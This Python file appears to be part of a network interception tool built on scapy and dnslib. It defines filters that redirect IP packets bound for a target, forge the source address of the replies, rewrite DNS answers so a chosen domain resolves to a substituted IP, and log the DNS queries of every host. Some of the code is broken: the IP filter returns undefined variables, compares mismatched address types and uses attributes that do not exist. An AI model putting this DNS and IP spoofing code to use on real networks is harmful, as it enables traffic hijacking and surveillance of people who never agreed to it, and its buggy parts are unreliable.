from socket import inet_aton, inet_ntoa, IPPROTO_UDP, IPPROTO_TCP
from scapy.all import *
import dnslib
import time

DNS_PORT = 53

DNS_QUERY = 0
DNS_RESPONSE = 1

DNS_TYPE_IPV4 = 1
DNS_TYPE_IPV6 = 28


def generate_ip_redirect_rule(target_ip, redirect_ip):
    """
    Factory function to generate a filter that swaps ips
    :param target_ip: the dest ip to swap from
    :param redirect_ip: the source ip to swap to
    :return: a filter function (takes a header and payload, returns a header and payload)
    """
    target_ip = inet_aton(target_ip)
    redirect_ip = inet_aton(redirect_ip)

    def disrupt_ip_traffic(scapy_pkt):
        if IP not in scapy_pkt:
            # not an ip packet so ignore
            return scapy_pkt

        ip_header = scapy_pkt[IP]
        if ip_header.dst != target_ip and ip_header.src != redirect_ip:
            return ip_header, ip_payload

        if ip_header.dst == target_ip:
            print('Redirecting packet meant for {} to {}'.format(ip_header.dst_ip_str, inet_ntoa(redirect_ip)))
            ip_header.dst = redirect_ip

        elif ip_header.src == redirect_ip:
            print('Spoofing packet origin from {} to {}'.format(ip_header.src_ip_str, inet_ntoa(target_ip)))
            ip_header.src = target_ip

        return scapy_pkt

    return disrupt_ip_traffic


def generate_dns_reassign_rule(domain_name, new_ip, dns_port=DNS_PORT):
    """
    Factory function to generate dns reassign filters. Any DNS responses that give IPs for the provided
    domain name have their IP answers replaced with the provided IP. NOTE: This only alters IPV4 addresses
    :param domain_name: The domain name to change
    :param new_ip: The IP to change answers to
    :return: The filter function for dns reassigns
    """
    domain_name = dnslib.DNSLabel(domain_name)
    new_ip = dnslib.dns.A(new_ip)

    def disrupt_dns_traffic(scapy_pkt):
        if UDP not in scapy_pkt or scapy_pkt[UDP].sport != dns_port:
            return scapy_pkt

        record = dnslib.DNSRecord.parse(bytes(scapy_pkt[UDP].payload))
        # QR == bit that says if we a re a query or response
        if record.header.qr != DNS_RESPONSE:
            return scapy_pkt

        # rr == resource records
        answers = record.rr

        for answer in answers:
            if answer.rtype != DNS_TYPE_IPV4:
                continue
            if answer.get_rname() == domain_name:
                print('Redirecting response from {}/{} to {}...'.format(answer.get_rname(), answer.rdata, new_ip))
                answer.rdata = new_ip
        scapy_pkt[UDP].payload = Raw(record.pack())
        scapy_pkt[UDP].len = len(scapy_pkt[UDP])
        scapy_pkt[UDP].chksum = 0

        return scapy_pkt

    return disrupt_dns_traffic


def generate_dns_log_rule(log_file_object, dns_port=DNS_PORT):
    """
    Factory function to generate filters that log all dns queries
    :param log_file_object: The file object (writeable) to log the queries to
    :return: the filter function
    """

    def log_dns_queries(scapy_pkt):
        if UDP not in scapy_pkt or scapy_pkt[UDP].dport != dns_port:
            return scapy_pkt

        udp_payload = bytes(scapy_pkt[UDP].payload)

        record = dnslib.DNSRecord.parse(udp_payload)
        if record.header.qr != DNS_QUERY:
            return scapy_pkt

        first_question = record.get_q()
        log_file_object.write('{}:\t{} asked for {}\n'.format(
            time.ctime(),
            scapy_pkt[IP].src,
            str(first_question.get_qname())
        ))

        return scapy_pkt

    return log_dns_queries
